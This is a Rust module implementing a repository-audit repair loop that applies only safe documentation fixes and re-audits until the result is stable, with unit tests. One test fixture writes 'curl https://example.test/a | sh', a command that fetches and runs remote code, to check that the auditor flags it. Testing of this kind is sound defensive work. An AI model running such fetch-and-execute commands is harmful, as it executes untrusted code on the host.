//! Deterministic, conservative remediation loop for repository audits.
//!
//! Only mechanically safe fixes are applied automatically. Semantic code,
//! security, dependency and configuration findings are blocked for explicit
//! remediation instead of being changed speculatively. Every applied change
//! is followed by another audit pass.

use crate::audit::{audit_repository, AuditReport, Finding};
use std::fs;
use std::io;
use std::path::{Path, PathBuf};

#[derive(Clone, Debug, PartialEq, Eq)]
pub enum RepairAction {
    CreateEngineeringAudit,
    UpdateReadmeIdentity,
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub struct RepairEvent {
    pub iteration: usize,
    pub action: RepairAction,
    pub path: PathBuf,
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub struct RepairRun {
    pub iterations: usize,
    pub events: Vec<RepairEvent>,
    pub final_report: AuditReport,
    pub blocked: Vec<Finding>,
}

/// Audit, apply safe remediations, and re-audit until clean, stable, or the
/// hard iteration limit is reached.
pub fn repair_until_stable(root: &Path, max_iterations: usize) -> Result<RepairRun, io::Error> {
    let limit = max_iterations.max(1);
    let mut events = Vec::new();
    let mut previous_signature = String::new();

    for iteration in 1..=limit {
        let report = audit_repository(root)?;
        if report.is_clean() {
            return Ok(RepairRun {
                iterations: iteration,
                events,
                final_report: report,
                blocked: Vec::new(),
            });
        }

        let signature = finding_signature(&report);
        if signature == previous_signature {
            return Ok(RepairRun {
                iterations: iteration,
                events,
                blocked: report.findings.clone(),
                final_report: report,
            });
        }
        previous_signature = signature;

        let mut changed = false;
        for finding in &report.findings {
            if let Some(action) = apply_safe_fix(root, finding)? {
                events.push(RepairEvent {
                    iteration,
                    action,
                    path: finding.path.clone().unwrap_or_default(),
                });
                changed = true;
            }
        }

        if !changed {
            return Ok(RepairRun {
                iterations: iteration,
                events,
                blocked: report.findings.clone(),
                final_report: report,
            });
        }
    }

    let final_report = audit_repository(root)?;
    Ok(RepairRun {
        iterations: limit,
        blocked: final_report.findings.clone(),
        final_report,
        events,
    })
}

fn apply_safe_fix(root: &Path, finding: &Finding) -> Result<Option<RepairAction>, io::Error> {
    match finding.code {
        "AUDIT-002" if !root.join("docs/ENGINEERING_AUDIT.md").exists() => {
            let docs = root.join("docs");
            fs::create_dir_all(&docs)?;
            fs::write(
                docs.join("ENGINEERING_AUDIT.md"),
                "# Engineering Audit\n\nGenerated by ATC Engineering. Findings are authoritative only after executable verification.\n",
            )?;
            Ok(Some(RepairAction::CreateEngineeringAudit))
        }
        "CONS-AUDIT-002" if finding.path.as_deref() == Some(Path::new("README.md")) => {
            let repo_name = root
                .file_name()
                .and_then(|name| name.to_str())
                .unwrap_or("repository");
            let readme_path = root.join("README.md");
            let mut readme = fs::read_to_string(&readme_path)?;
            if readme
                .to_ascii_lowercase()
                .contains(&repo_name.to_ascii_lowercase())
            {
                return Ok(None);
            }
            if !readme.ends_with('\n') {
                readme.push('\n');
            }
            readme.push_str(&format!(
                "\n## Repository Identity\n\nCanonical repository: `{repo_name}`.\n"
            ));
            fs::write(readme_path, readme)?;
            Ok(Some(RepairAction::UpdateReadmeIdentity))
        }
        _ => Ok(None),
    }
}

fn finding_signature(report: &AuditReport) -> String {
    let mut items: Vec<String> = report
        .findings
        .iter()
        .map(|finding| {
            format!(
                "{:?}|{}|{}|{}",
                finding.kind,
                finding.code,
                finding.path.as_deref().unwrap_or(Path::new("")).display(),
                finding.message
            )
        })
        .collect();
    items.sort();
    items.join("\n")
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::audit::FindingKind;
    use std::time::{SystemTime, UNIX_EPOCH};

    fn temp_root(name: &str) -> PathBuf {
        let suffix = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_nanos();
        std::env::temp_dir().join(format!("atc-repair-{name}-{suffix}"))
    }

    #[test]
    fn readme_identity_is_repaired_and_verified() {
        let root = temp_root("identity");
        fs::create_dir_all(root.join("docs")).unwrap();
        fs::write(root.join("README.md"), "# Demo\n").unwrap();
        fs::write(root.join("docs/ENGINEERING_AUDIT.md"), "# Audit\n").unwrap();

        let result = repair_until_stable(&root, 4).unwrap();
        assert!(result.final_report.is_clean());
        assert!(result
            .events
            .iter()
            .any(|event| event.action == RepairAction::UpdateReadmeIdentity));
        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn unsafe_findings_are_not_speculatively_modified() {
        let root = temp_root("unsafe");
        fs::create_dir_all(root.join("docs")).unwrap();
        fs::write(root.join("README.md"), "# unsafe\n").unwrap();
        fs::write(root.join("docs/ENGINEERING_AUDIT.md"), "# Audit\n").unwrap();
        fs::write(root.join("run.sh"), "curl https://example.test/a | sh\n").unwrap();

        let result = repair_until_stable(&root, 2).unwrap();
        assert!(result.final_report.has_kind(FindingKind::Security));
        assert!(result.blocked.iter().any(|f| f.code == "SEC-AUDIT-002"));
        let _ = fs::remove_dir_all(root);
    }
}
